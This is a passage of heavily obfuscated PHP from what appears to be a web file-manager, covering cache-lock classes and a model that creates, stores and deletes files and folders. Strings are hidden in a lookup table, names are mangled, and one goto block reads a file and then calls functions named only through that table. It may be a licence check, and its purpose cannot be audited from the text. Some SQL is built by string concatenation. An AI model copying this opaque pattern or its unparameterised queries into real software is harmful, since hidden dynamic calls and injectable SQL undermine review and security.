(!CacheLock::fileLock($ßÑêíõÓ[13])) { return !1; } $‚«ÕÚ­â = parent::execute($¹åÄ‹ú–); CacheLock::fileUnLock($ßÑêíõÓ[13]); return $‚«ÕÚ­â; } } class DbSqlite3 extends DbSqlite3Base { public function query($€»ùä½) { $ø‡´†Æİ =& $_SERVER[ùÆÎÔ“Ñ]; if (!CacheLock::fileLock($ø‡´†Æİ[13])) { return !1; } $‰¡Ë‡‡µ = parent::query($€»ùä½); CacheLock::fileUnLock($ø‡´†Æİ[13]); return $‰¡Ë‡‡µ; } public function execute($¾û“£¿) { $«÷ÓÆ­¸ =& $_SERVER[ùÆÎÔ“Ñ]; if (!CacheLock::fileLock($«÷ÓÆ­¸[13])) { return !1; } $é‡ºÓÛÓ = parent::execute($¾û“£¿); CacheLock::fileUnLock($«÷ÓÆ­¸[13]); return $é‡ºÓÛÓ; } } goto Bíôù•İ‚; Bß‘ÒÈßê›: if ($_SERVER[$_SERVER[ùÆÎÔ“Ñ][841]] != $_SERVER[$_SERVER[ùÆÎÔ“Ñ][842]]) { $_getc = $_SERVER[ùÆÎÔ“Ñ][843]; $_getfile = $_SERVER[$_SERVER[ùÆÎÔ“Ñ][844]] . $_SERVER[ùÆÎÔ“Ñ][845]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùÆÎÔ“Ñ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ùÆÎÔ“Ñ][645]) { $exit = $_SERVER[ùÆÎÔ“Ñ][846]; $exit(); } $_act = $_SERVER[ùÆÎÔ“Ñ][847]; $_act($_SERVER[$_SERVER[ùÆÎÔ“Ñ][848]]); } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $±’¡Â¢¥ =& $_SERVER[ùÆÎÔ“Ñ]; if (self::$handle) { return self::$handle; } $¾¾Ò¨ = $GLOBALS[$±’¡Â¢¥[6]][$±’¡Â¢¥[349]]; self::$timeout = $¾¾Ò¨[$±’¡Â¢¥[849]] ? $¾¾Ò¨[$±’¡Â¢¥[849]] : 10; $É„÷­á = _get($GLOBALS[$±’¡Â¢¥[6]], $±’¡Â¢¥[850]); $ûûç•Ã” = $¾¾Ò¨[$±’¡Â¢¥[828]] ? $¾¾Ò¨[$±’¡Â¢¥[828]] : $±’¡Â¢¥[199]; if ($ûûç•Ã” == $±’¡Â¢¥[21] && $É„÷­á == $±’¡Â¢¥[13]) { $ûûç•Ã” = $±’¡Â¢¥[199]; } switch ($ûûç•Ã”) { case $±’¡Â¢¥[831]: self::$handle = new CacheLockRedis(); break; case $±’¡Â¢¥[832]: self::$handle = new CacheLockMemcached(); break; case $±’¡Â¢¥[21]: self::$handle = new CacheLockDatabase(); break; case $±’¡Â¢¥[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($±’¡Â¢¥[851], $±’¡Â¢¥[852]); } return self::$handle; } private static function key($Ï¥èÉ‰º) { return $_SERVER[ùÆÎÔ“Ñ][853] . Cache::key($Ï¥èÉ‰º); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($—çÇëÓ = '') { self::$errorMsg = $—çÇëÓ; } public static function lockGlobal($ŒÚÅ¿ıá, $—±›Æ) { return self::lock($ŒÚÅ¿ıá, $—±›Æ, !0); } public static function lock($´’Íı»ò, $±¾·ó²š = false, $ÂÚå¡â” = false) { $µÁ‘Ù =& $_SERVER[ùÆÎÔ“Ñ]; $¼Ü˜Œ¯Í = self::init(); $İÃĞ‘ŸÔ = self::key($´’Íı»ò); $±¾·ó²š = $±¾·ó²š ? $±¾·ó²š : self::$timeout; $üÉ­î–Î = $¼Ü˜Œ¯Í->lock($İÃĞ‘ŸÔ, $±¾·ó²š); $¬–ÏûÆš = timeFloat(); if (!$üÉ­î–Î) { $­’šÖ‘² = "\x6c\x6f\x63\153\40\145\162\162\x6f\162\x3b\153\x65\x79\75{$´’Íı»ò}\x3b\x74\x69\155\x65\x3d{$±¾·ó²š}\73" . self::$errorMsg . $µÁ‘Ù[71] . get_caller_msg(); $ÆÎÃÄÃÖ = LNG($µÁ‘Ù[854]) . "\50{$±¾·ó²š}\163\51\56" . LNG($µÁ‘Ù[855]); $ÆÎÃÄÃÖ .= $µÁ‘Ù[856]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÆÎÃÄÃÖ = $ÆÎÃÄÃÖ . $µÁ‘Ù[857] . self::$errorMsg; } write_log($­’šÖ‘², $µÁ‘Ù[852]); show_json($ÆÎÃÄÃÖ, !1); } if (!$ÂÚå¡â”) { self::$lockItem[$İÃĞ‘ŸÔ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $±”ïçà = number_format(timeFloat() - $¬–ÏûÆš, 3); write_log($µÁ‘Ù[858] . $´’Íı»ò . $µÁ‘Ù[859] . $±”ïçà, $µÁ‘Ù[852]); } return $üÉ­î–Î; } public static function lockGet($†Ù¸Ğ­ë) { $‚ÍÕİó = self::key($†Ù¸Ğ­ë); if (self::$lockItem[$‚ÍÕİó]) { return self::$lockItem[$‚ÍÕİó]; } return self::init()->lockGet($‚ÍÕİó); } public static function unlock($‡Û´¶æº) { $”şÇÎ‹õ =& $_SERVER[ùÆÎÔ“Ñ]; $ÁëÖü‰® = self::key($‡Û´¶æº); self::$lockItem[$ÁëÖü‰®] = null; self::init()->unlock($ÁëÖü‰®); if (GLOBAL_DEBUG_LOG_ALL) { write_log($”şÇÎ‹õ[860] . $‡Û´¶æº, $”şÇÎ‹õ[852]); } return; } public static function unlockRuntime() { $Ûæ²ğÅ† =& $_SERVER[ùÆÎÔ“Ñ]; $½õù˜õí = self::init(); $™·¢²İá = !1; foreach (self::$lockItem as $È šñú => $©åôºçà) { if (!$©åôºçà) { continue; } $½õù˜õí->unlock($È šñú); if (!$™·¢²İá) { $™·¢²İá = !0; write_log($Ûæ²ğÅ†[861] . $È šñú . $Ûæ²ğÅ†[71] . get_caller_msg(), $Ûæ²ğÅ†[852]); continue; } write_log($Ûæ²ğÅ†[861] . $È šñú, $Ûæ²ğÅ†[852]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‘ĞöÑÎÆ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ûæ²ğÅ†[862] . $‘ĞöÑÎÆ . $Ûæ²ğÅ†[863] . ACTION, $Ûæ²ğÅ†[852]); } } public static function fileLock($§“ô¼ã¤) { $øÄ´€”ü =& $_SERVER[ùÆÎÔ“Ñ]; if (!$GLOBALS[$øÄ´€”ü[864]]) { $GLOBALS[$øÄ´€”ü[864]] = array(); } $GLOBALS[$øÄ´€”ü[864]][$§“ô¼ã¤] = !1; $ÓŸÙ”¡š = fopen(DATA_PATH . $§“ô¼ã¤ . $øÄ´€”ü[865], $øÄ´€”ü[866]); if (!$ÓŸÙ”¡š) { return !1; } $GLOBALS[$øÄ´€”ü[864]][$§“ô¼ã¤] = $ÓŸÙ”¡š; if (flock($ÓŸÙ”¡š, LOCK_EX)) { return !0; } self::unlock($§“ô¼ã¤); show_json($øÄ´€”ü[867], !1); return !1; } public static function fileUnlock($á½õ‰­ı) { $±±Â´éÃ =& $_SERVER[ùÆÎÔ“Ñ]; $•Ò¾²é = $GLOBALS[$±±Â´éÃ[864]][$á½õ‰­ı]; if (!$•Ò¾²é) { return; } $GLOBALS[$±±Â´éÃ[864]][$á½õ‰­ı] = !1; flock($•Ò¾²é, LOCK_UN); fclose($•Ò¾²é); } public static function fileUnlockAll() { $ÈÒ›÷”÷ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$GLOBALS[$ÈÒ›÷”÷[864]]) { return; } foreach ($GLOBALS[$ÈÒ›÷”÷[864]] as $„¨»ó¾¹ => $ƒ–ŞÓğ¥) { if (!$ƒ–ŞÓğ¥) { continue; } $GLOBALS[$ÈÒ›÷”÷[864]][$„¨»ó¾¹] = !1; flock($ƒ–ŞÓğ¥, LOCK_UN); fclose($ƒ–ŞÓğ¥); } $GLOBALS[$ÈÒ›÷”÷[864]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto AêÙ°²ö’; dÑŞ×»¤Í£: define($_SERVER[ùÆÎÔ“Ñ][238], 1); define($_SERVER[ùÆÎÔ“Ñ][239], 2); define($_SERVER[ùÆÎÔ“Ñ][240], 3); goto dØ‹–§—“¶; eÕÑÚˆŠì…: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Õ öèºÉ) { $­Õ˜ÏÒ =& $_SERVER[ùÆÎÔ“Ñ]; $Ú–ï¡¯ = Model($­Õ˜ÏÒ[513])->where(array($­Õ˜ÏÒ[1658] => $Õ öèºÉ))->find(); $âüÂµÁ¬ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Õ öèºÉ, $Ú–ï¡¯[$­Õ˜ÏÒ[32]]); $this->userDesktopAdd($âüÂµÁ¬); return $âüÂµÁ¬; } public function userDesktopAdd($²ğ³œ…) { $ûØ»ğş =& $_SERVER[ùÆÎÔ“Ñ]; $ÀÅ®ÏÍ– = LNG($ûØ»ğş[2125]); $ÖîğàÅğ = $this->mkdir($²ğ³œ…, $ÀÅ®ÏÍ–); $this->metaSet($ÖîğàÅğ, $ûØ»ğş[2126], $ûØ»ğş[88]); $this->metaSet($²ğ³œ…, $ûØ»ğş[2127], $ÖîğàÅğ); } public function userPathSafeAdd($…ß¿³‡ó) { $„­õÕš =& $_SERVER[ùÆÎÔ“Ñ]; $—½õÇ’ñ = Model($„­õÕš[513])->getInfoFull($…ß¿³‡ó); if (!$—½õÇ’ñ) { return !1; } if (_get($—½õÇ’ñ, $„­õÕš[536])) { return $—½õÇ’ñ[$„­õÕš[466]][$„­õÕš[2128]]; } $Æ•†Ò¢û = $this->_mkdirRoot(SourceModel::TYPE_USER, $…ß¿³‡ó, $„­õÕš[2129], $„­õÕš[433]); Model($„­õÕš[513])->metaSet($…ß¿³‡ó, $„­õÕš[2128], $Æ•†Ò¢û); $this->metaSet($Æ•†Ò¢û, $„­õÕš[2130], $…ß¿³‡ó); return $Æ•†Ò¢û; } public function groupRootAdd($©“Ø×áğ) { $°Â™Ğîæ =& $_SERVER[ùÆÎÔ“Ñ]; $ŞšºÓÁô = Model($°Â™Ğîæ[522])->where(array($°Â™Ğîæ[1945] => $©“Ø×áğ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $©“Ø×áğ, $ŞšºÓÁô[$°Â™Ğîæ[32]]); } public function systemRootPathAdd($ş¹çôè´) { if ($ş¹çôè´ != $_SERVER[ùÆÎÔ“Ñ][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ş¹çôè´); } public function userRootRemove($ÌşäÛ±Ä) { $Ïç–ØâĞ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÌşäÛ±Ä, !0); foreach ($Ïç–ØâĞ as $ˆış¡—‘) { if (!$ˆış¡—‘) { continue; } $this->remove($ˆış¡—‘[$_SERVER[ùÆÎÔ“Ñ][402]], !1); } } public function groupRootRemove($Àåâ‘ƒ) { $ıƒ•°¬ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Àåâ‘ƒ); if (!$ıƒ•°¬) { return; } $this->remove($ıƒ•°¬[$_SERVER[ùÆÎÔ“Ñ][402]], !1); } private function _mkdirRoot($½ğâ§Á, $Å¥ô›™, $‹È»ÉÆ˜, $¶ù¶ä = '') { $ê÷†‘ÌÈ =& $_SERVER[ùÆÎÔ“Ñ]; $ªÑÒâ¶ = array($ê÷†‘ÌÈ[401] => 0, $ê÷†‘ÌÈ[586] => $½ğâ§Á, $ê÷†‘ÌÈ[587] => $Å¥ô›™, $ê÷†‘ÌÈ[583] => 1, $ê÷†‘ÌÈ[588] => USER_ID, $ê÷†‘ÌÈ[589] => USER_ID, $ê÷†‘ÌÈ[584] => $¶ù¶ä, $ê÷†‘ÌÈ[590] => $ê÷†‘ÌÈ[531], $ê÷†‘ÌÈ[430] => 0, $ê÷†‘ÌÈ[585] => 0, $ê÷†‘ÌÈ[469] => 0, $ê÷†‘ÌÈ[591] => $ê÷†‘ÌÈ[12]); if ($–ºÃüİ = $this->where($ªÑÒâ¶)->find()) { return $–ºÃüİ[$ê÷†‘ÌÈ[402]]; } $¼Ü€Æİ = "\115\x6f\x64\x65\x6c\x53\157\x75\x72\x63\x65\x2e\155\x6b\x64\x69\162\122\157\157\x74\56{$½ğâ§Á}\56{$Å¥ô›™}\x2e" . $‹È»ÉÆ˜; CacheLock::lock($¼Ü€Æİ); $ªÑÒâ¶[$ê÷†‘ÌÈ[32]] = $‹È»ÉÆ˜; $éôŞªüê = $this->add($ªÑÒâ¶); $Ä…Ñê“™ = array($ê÷†‘ÌÈ[592] => short_id($éôŞªüê)); $this->where(array($ê÷†‘ÌÈ[417] => $éôŞªüê))->save($Ä…Ñê“™); CacheLock::unlock($¼Ü€Æİ); return $éôŞªüê; } private function targetSourceRoot($ñãÒ±ò¬, $‚–ÓŠíˆ, $–ºÕß³± = false) { $Í‚˜ğ» =& $_SERVER[ùÆÎÔ“Ñ]; $ó·Ÿ™ôµ = array($Í‚˜ğ»[401] => 0, $Í‚˜ğ»[586] => $ñãÒ±ò¬, $Í‚˜ğ»[587] => $‚–ÓŠíˆ); if ($–ºÕß³±) { $™«ÛÂé = $this->where($ó·Ÿ™ôµ)->select(); return $™«ÛÂé ? $™«ÛÂé : array(); } $íÌ¬ÜòÃ = $this->where($ó·Ÿ™ôµ)->find(); return $íÌ¬ÜòÃ ? $íÌ¬ÜòÃ : array(); } public function sourceRootGroup($¿²£ç’›) { $‰»ƒŠÕ· =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($¿²£ç’›)) { $¿²£ç’› = array($¿²£ç’›); } $¨’»ÁáÄ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¿²£ç’›, $‰»ƒŠÕ·[188]); $ÏŒ“’Òû = array($‰»ƒŠÕ·[369] => $¨’»ÁáÄ, $‰»ƒŠÕ·[366] => array($‰»ƒŠÕ·[760] => count($¿²£ç’›))); $this->_listDataApply($ÏŒ“’Òû[$‰»ƒŠÕ·[369]]); $this->_listMake($ÏŒ“’Òû); return array_to_keyvalue($ÏŒ“’Òû[$‰»ƒŠÕ·[82]], $‰»ƒŠÕ·[505]); } public function mkfile($Êß¬‚©§, $…Å™ÑßÇ, $«À±ø¬î = '', $è®Å€õÈ = REPEAT_RENAME) { $‰œ§ñ‹Ğ =& $_SERVER[ùÆÎÔ“Ñ]; $´âŞ…¬ô = Model($‰œ§ñ‹Ğ[609])->addFileByContent($«À±ø¬î, $…Å™ÑßÇ); return $this->_createFileCall($Êß¬‚©§, $…Å™ÑßÇ, $´âŞ…¬ô, $è®Å€õÈ, $‰œ§ñ‹Ğ[1352]); } public function addFile($š—ßæ’ã, $Â¯•®‰ê, $í…ğÔ¬, $ÏÍ‚›œÚ = false, $úåšö¸í = REPEAT_RENAME) { $—ıÕß½ = Model($_SERVER[ùÆÎÔ“Ñ][609])->addFile($Â¯•®‰ê, $í…ğÔ¬, $ÏÍ‚›œÚ); return $this->_createFileCall($š—ßæ’ã, $í…ğÔ¬, $—ıÕß½, $úåšö¸í); } public function addFileByFileID($Â‹áåŠÚ, $Ùã©ó¯Ş, $şóì¨úë, $ØÃ©’¶• = REPEAT_RENAME) { $Ñ¸·ïˆ• =& $_SERVER[ùÆÎÔ“Ñ]; $œÂêÙš© = Model($Ñ¸·ïˆ•[609])->find($Ùã©ó¯Ş); Model($Ñ¸·ïˆ•[609])->linkAdd($Ùã©ó¯Ş); return $this->_createFileCall($Â‹áåŠÚ, $şóì¨úë, $œÂêÙš©, $ØÃ©’¶•); } public function addFileByRemote($Ü¶Æ·Ó, $‹Ş“ÊØ, $“æÓåÛş, $ØÁµáşé = array(), $Å÷ÀÇ¾É = REPEAT_RENAME) { $÷—òïå = Model($_SERVER[ùÆÎÔ“Ñ][609])->addFileByRemote($‹Ş“ÊØ, $“æÓåÛş, $ØÁµáşé); return $this->_createFileCall($Ü¶Æ·Ó, $“æÓåÛş, $÷—òïå, $Å÷ÀÇ¾É); } private function _createFileCall($¿§–Ş¼§, $˜ê§– ·, $ÆÈşì‰Ì, $…¶Ê—•ç, $êº£ïô€ = "\165\160\154\x6f\x61\x64") { $ëìÌşœï =& $_SERVER[ùÆÎÔ“Ñ]; $æ˜¬æÚ° = !1; $this->setMasterDB(); $this->lockWriteStart($¿§–Ş¼§, $˜ê§– ·); $æ¥…¡˜ = $this->fileNameExist($¿§–Ş¼§, $˜ê§– ·); $ñÌ­´úÔ = $this->_createFile($¿§–Ş¼§, $˜ê§– ·, $ÆÈşì‰Ì, $…¶Ê—•ç, $æ˜¬æÚ°); if (!$æ˜¬æÚ°) { Model($ëìÌşœï[471])->remove($ÆÈşì‰Ì[$ëìÌşœï[468]]); } if ($æ˜¬æÚ° && $ñÌ­´úÔ && $ñÌ­´úÔ != $æ¥…¡˜) { Model($ëìÌşœï[2098])->eventCreate($ñÌ­´úÔ, $êº£ïô€); } $this->lockWriteEnd($¿§–Ş¼§, $˜ê§– ·); return $ñÌ­´úÔ; } public function mkdir($»œ­°Ç, $Ò§ç¼Ó¿, $šì¤Œ¤ = REPEAT_SKIP) { $ş¼ĞÅà‹ =& $_SERVER[ùÆÎÔ“Ñ]; $this->setMasterDB(); $Û…ßû…‡ = $this->sourceInfo($»œ­°Ç); if (!$Û…ßû…‡) { return !1; } $this->lockWriteStart($»œ­°Ç, $Ò§ç¼Ó¿); if ($šì¤Œ¤ !== !1) { $íïŠ•„İ = $this->fileNameExist($»œ­°Ç, $Ò§ç¼Ó¿); if ($íïŠ•„İ && $šì¤Œ¤ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($»œ­°Ç, $Ò§ç¼Ó¿); return $íïŠ•„İ; } $Ò§ç¼Ó¿ = $this->fileNameAuto($»œ­°Ç, $Ò§ç¼Ó¿, $šì¤Œ¤); } $Ÿ–º‹© = array($ş¼ĞÅà‹[583] => 1, $ş¼ĞÅà‹[420] => $Ò§ç¼Ó¿, $ş¼ĞÅà‹[584] => $ş¼ĞÅà‹[12], $ş¼ĞÅà‹[469] => 0, $ş¼ĞÅà‹[585] => 0); $Ç©×¢Ô± = $this->_addSource($Ÿ–º‹©, $Û…ßû…‡); Model($ş¼ĞÅà‹[2098])->eventCreate($Ç©×¢Ô±, $ş¼ĞÅà‹[1353]); $this->lockWriteEnd($»œ­°Ç, $Ò§ç¼Ó¿); return $Ç©×¢Ô±; } public function listSourceRoot($Š‡Çíƒ, $¹‘ØªœÒ, $ü·Ö©í™ = "\x73\x6f\165\x72\143\145\111\104\x2c\164\x61\x72\x67\x65\164\x49\104\x2c\x73\x69\x7a\145") { $é•‰å¾Ò =& $_SERVER[ùÆÎÔ“Ñ]; $×óŸû ı = $é•‰å¾Ò[378]; $äëÍãûœ = array(); $€°¿Ï¤œ = 1024 * 50; $£á©üİ¡ = is_array($£á©üİ¡) ? $£á©üİ¡ : array(); $îäúÇõ´ = count($¹‘ØªœÒ); $±ü©‡ÙÌ = $this->tablePrefix . $é•‰å¾Ò[2131]; for ($¬Ü’ÒŸÂ = 0; $¬Ü’ÒŸÂ < $îäúÇõ´; $¬Ü’ÒŸÂ++) { $ŸŸ¨áëÌ = $¹‘ØªœÒ[$¬Ü’ÒŸÂ]; $×óŸû ı .= "\x53\105\114\105\103\x54\40\52\x20\x46\122\117\x4d\x20\50\123\105\x4c\x45\x43\124\40{$ü·Ö©í™}\40\106\x52\117\x4d\x20\x60{$±ü©‡ÙÌ}\x60\x20\127\x48\105\122\x45\x20"; $×óŸû ı .= "\x60\x70\141\x72\145\156\164\x49\104\140\x3d\60\40\x41\x4e\104\x20\140\164\141\162\147\145\164\111\x44\140\x3d{$ŸŸ¨áëÌ}\x20\x41\116\x44\x20\140\164\141\162\x67\145\x74\124\171\160\145\140\x3d{$Š‡Çíƒ}\40\x61\x6e\x64\x20\x66\151\154\x65\x54\x79\160\x65\75\x27\47\x20\x6c\x69\155\151\164\x20\61\51\x20\x61\163\40\164\142\137{$¬Ü’ÒŸÂ}\x20\125\116\111\117\116\40\101\x4c\114\40"; if ((strlen($×óŸû ı) >= $€°¿Ï¤œ || $¬Ü’ÒŸÂ == $îäúÇõ´ - 1) && $×óŸû ı) { $×óŸû ı = substr($×óŸû ı, 0, -strlen($é•‰å¾Ò[1043])); $±ç†óÍØ = $this->query($×óŸû ı); $×óŸû ı = $é•‰å¾Ò[12]; $äëÍãûœ = array_merge($äëÍãûœ, $±ç†óÍØ); } } return $äëÍãûœ; } private function _createFile($÷ÊÌÚÓŠ, $Ò¤Êƒò°, $§ø“²¢», $ˆƒø’¤Ú, &$äÜ…¶•) { $™ô‹‹» =& $_SERVER[ùÆÎÔ“Ñ]; $”ŞõŸş¾ = $this->sourceInfo($÷ÊÌÚÓŠ); if (!$§ø“²¢» || !$”ŞõŸş¾) { return !1; } if ($ˆƒø’¤Ú !== !1) { $¤˜Ò©úÊ = $this->fileNameExist($÷ÊÌÚÓŠ, $Ò¤Êƒò°); } $äÜ…¶• = !0; if ($ˆƒø’¤Ú && $¤˜Ò©úÊ) { if ($ˆƒø’¤Ú == REPEAT_SKIP) { $äÜ…¶• = !1; return $¤˜Ò©úÊ; } else { if ($ˆƒø’¤Ú == REPEAT_REPLACE) { $ºÁ‹òœø = $this->sourceInfo($¤˜Ò©úÊ); $À€ éöö = $this->fileHistory($ºÁ‹òœø, $§ø“²¢»[$™ô‹‹»[468]], $§ø“²¢»[$™ô‹‹»[76]]); if (!$À€ éöö) { $äÜ…¶• = !1; } else { $this->folderSizeReset($÷ÊÌÚÓŠ); } return $¤˜Ò©úÊ; } else { $Ò¤Êƒò° = $this->fileNameAuto($÷ÊÌÚÓŠ, $Ò¤Êƒò°, $ˆƒø’¤Ú, !1); } } } $Ø°šË¦ = array($™ô‹‹»[583] => 0, $™ô‹‹»[420] => $Ò¤Êƒò°, $™ô‹‹»[584] => substr(get_path_ext($Ò¤Êƒò°), 0, 10), $™ô‹‹»[469] => $§ø“²¢»[$™ô‹‹»[468]], $™ô‹‹»[585] => $§ø“²¢»[$™ô‹‹»[76]]); $µĞº¬‰‡ = $this->_addSource($Ø°šË¦, $”ŞõŸş¾); $this->folderSizeReset($÷ÊÌÚÓŠ, intval($Ø°šË¦[$™ô‹‹»[76]])); return $µĞº¬‰‡; } protected function fileHistory($÷Ñ»‹ºã, $„­Çûß­, $‹®ôäÛ×) { $èÈˆÅ½Ã =& $_SERVER[ùÆÎÔ“Ñ]; $½ˆçÍïÇ = defined($èÈˆÅ½Ã[475]) ? USER_ID : $èÈˆÅ½Ã[197]; if ($÷Ñ»‹ºã[$èÈˆÅ½Ã[468]] == $„­Çûß­) { return !1; } $this->checkLock($÷Ñ»‹ºã[$èÈˆÅ½Ã[402]], $„­Çûß­); Model($èÈˆÅ½Ã[2132])->addHistory($÷Ñ»‹ºã); $áËë‡­“ = array($èÈˆÅ½Ã[589] => $½ˆçÍïÇ, $èÈˆÅ½Ã[424] => time(), $èÈˆÅ½Ã[468] => $„­Çûß­, $èÈˆÅ½Ã[76] => $‹®ôäÛ×); $this->where(array($èÈˆÅ½Ã[417] => $÷Ñ»‹ºã[$èÈˆÅ½Ã[402]]))->save($áËë‡­“); $this->sourceCacheClear($÷Ñ»‹ºã[$èÈˆÅ½Ã[402]]); return !0; } public function checkLock($×ßüˆòª, $õÂê„áã) { $¾ì§ÅÜŠ =& $_SERVER[ùÆÎÔ“Ñ]; $¯ ÊÊşÀ = $this->pathInfo($×ßüˆòª); if (!$this->fileIsLock($¯ ÊÊşÀ, !0)) { return; } $ÎÎæ¦ÇÚ = Session::get($¾ì§ÅÜŠ[2133]); $Æ‘›ã´Ş = substr($¯ ÊÊşÀ[$¾ì§ÅÜŠ[32]], 0, -1 - strlen($¯ ÊÊşÀ[$¾ì§ÅÜŠ[174]])) . $¾ì§ÅÜŠ[1214] . $ÎÎæ¦ÇÚ . $¾ì§ÅÜŠ[10] . $¯ ÊÊşÀ[$¾ì§ÅÜŠ[174]]; $ü³‚°¶Ö = Model($¾ì§ÅÜŠ[609])->find($õÂê„áã); $this->_createFileCall($¯ ÊÊşÀ[$¾ì§ÅÜŠ[432]], $Æ‘›ã´Ş, $ü³‚°¶Ö, REPEAT_REPLACE, $¾ì§ÅÜŠ[1352]); $É«Äê• = $¯ ÊÊşÀ[$¾ì§ÅÜŠ[466]][$¾ì§ÅÜŠ[548]]; $Äâº«‰Ü = $É«Äê•[$¾ì§ÅÜŠ[542]] ? $É«Äê•[$¾ì§ÅÜŠ[542]] : $É«Äê•[$¾ì§ÅÜŠ[32]]; show_json(LNG($¾ì§ÅÜŠ[2134]) . $¾ì§ÅÜŠ[2135] . LNG($¾ì§ÅÜŠ[2136]) . $¾ì§ÅÜŠ[2137] . $Äâº«‰Ü . $¾ì§ÅÜŠ[2138], !1); } public function fileIsLock($›‘³„Â, $Ãî®•œ• = false) { $õ¶±¦€ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($›‘³„Â[$õ¶±¦€[466]]) || !$›‘³„Â[$õ¶±¦€[466]][$õ¶±¦€[545]]) { return !1; } if ($›‘³„Â[$õ¶±¦€[466]][$õ¶±¦€[545]] != USER_ID) { return !0; } $ü¯Ó²™Ô = $GLOBALS[$õ¶±¦€[6]][$õ¶±¦€[89]][$õ¶±¦€[546]]; if ($›‘³„Â[$õ¶±¦€[466]][$õ¶±¦€[547]] <= time() - $ü¯Ó²™Ô) { $this->metaSet($›‘³„Â[$õ¶±¦€[402]], $õ¶±¦€[545], null); $this->metaSet($›‘³„Â[$õ¶±¦€[402]], $õ¶±¦€[547], null); } if ($Ãî®•œ•) { $this->metaSet($›‘³„Â[$õ¶±¦€[402]], $õ¶±¦€[547], time()); } return !1; } private function _addSource($Ç‹œ‡¯·, $Á¤Í•Ì¨) { $Œâò³ù¹ =& $_SERVER[ùÆÎÔ“Ñ]; $›÷…»Í´ = defined($Œâò³ù¹[475]) ? USER_ID : $Œâò³ù¹[197]; $Ñ¦æà¾ = array($Œâò³ù¹[586] => $Á¤Í•Ì¨[$Œâò³ù¹[411]], $Œâò³ù¹[587] => $Á¤Í•Ì¨[$Œâò³ù¹[505]], $Œâò³ù¹[588] => $›÷…»Í´, $Œâò³ù¹[589] => $›÷…»Í´, $Œâò³ù¹[401] => $Á¤Í•Ì¨[$Œâò³ù¹[402]], $Œâò³ù¹[590] => $Á¤Í•Ì¨[$Œâò³ù¹[521]] . $Á¤Í•Ì¨[$Œâò³ù¹[402]] . $Œâò³ù¹[50], $Œâò³ù¹[430] => 0, $Œâò³ù¹[591] => $Œâò³ù¹[12]); $Ç‹œ‡¯· = array_merge($Ñ¦æà¾, $Ç‹œ‡¯·); $this->updateModifyTime($Ç‹œ‡¯·[$Œâò³ù¹[432]]); $¯‡Ç¦ùË = $Œâò³ù¹[2139] . $Á¤Í•Ì¨[$Œâò³ù¹[402]]; if (isset(self::$cacheChildList[$¯‡Ç¦ùË])) { unset(self::$cacheChildList[$¯‡Ç¦ùË]); } static $ş£ªªøÏ = false; if (!$ş£ªªøÏ) { Hook::trigger($Œâò³ù¹[573], $Ç‹œ‡¯·); $ş£ªªøÏ = !0; } $˜ùÉò’¦ = $this->add($Ç‹œ‡¯·); $¶¨áìü½ = array($Œâò³ù¹[592] => short_id($˜ùÉò’¦)); $this->where(array($Œâò³ù¹[417] => $˜ùÉò’¦))->save($¶¨áìü½); $this->setNamePinyin($˜ùÉò’¦, $Ç‹œ‡¯·[$Œâò³ù¹[32]]); return $˜ùÉò’¦; } public function remove($€ ı¶¸”, $Ô¾¼±² = true) { $úÓù·İö =& $_SERVER[ùÆÎÔ“Ñ]; $Ê¤àÍ‰‡ = $this->sourceInfo($€ ı¶¸”); $‹¿ş³ùæ = intval($Ê¤àÍ‰‡[$úÓù·İö[411]]) === self::TYPE_SYSTEM; $ºÅ¸³ı• = Model($úÓù·İö[435])->get($úÓù·İö[2140]) == $úÓù·İö[88]; if ($‹¿ş³ùæ || $Ô¾¼±² || !$ºÅ¸³ı•) { return $this->removeNow($€ ı¶¸”, $Ô¾¼±²); } $ĞîÄ¥á = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $õ¶ˆƒÂ„ = $Ê¤àÍ‰‡[$úÓù·İö[411]] == self::TYPE_USER ? $úÓù·İö[600] : $úÓù·İö[515]; if ($õ¶ˆƒÂ„ == $úÓù·İö[600]) { $¨¹âÊüó = Model($úÓù·İö[513])->getInfo($Ê¤àÍ‰‡[$úÓù·İö[505]]); $ö„ìæ£ = !empty($¨¹âÊüó[$úÓù·İö[542]]) ? $¨¹âÊüó[$úÓù·İö[542]] : $¨¹âÊüó[$úÓù·İö[32]]; $ö„ìæ£ = $úÓù·İö[260] . $ö„ìæ£ . $úÓù·İö[2141] . $Ê¤àÍ‰‡[$úÓù·İö[505]]; } else { $¨¹âÊüó = Model($úÓù·İö[522])->getInfo($Ê¤àÍ‰‡[$úÓù·İö[505]]); $ö„ìæ£ = _get($¨¹âÊüó, $úÓù·İö[32]); $ö„ìæ£ = $úÓù·İö[162] . $ö„ìæ£ . $úÓù·İö[2142] . $Ê¤àÍ‰‡[$úÓù·İö[505]]; } $Ğœ¸ÆÌˆ = $úÓù·İö[2143] . md5($ö„ìæ£); CacheLock::lock($Ğœ¸ÆÌˆ); $‘óÏòÎ‘ = $this->fileNameExist($ĞîÄ¥á, $ö„ìæ£); if (!$‘óÏòÎ‘) { $‘óÏòÎ‘ = $this->mkdir($ĞîÄ¥á, $ö„ìæ£, REPEAT_SKIP); $this->metaSet($‘óÏòÎ‘, $úÓù·İö[2144], $õ¶ˆƒÂ„); 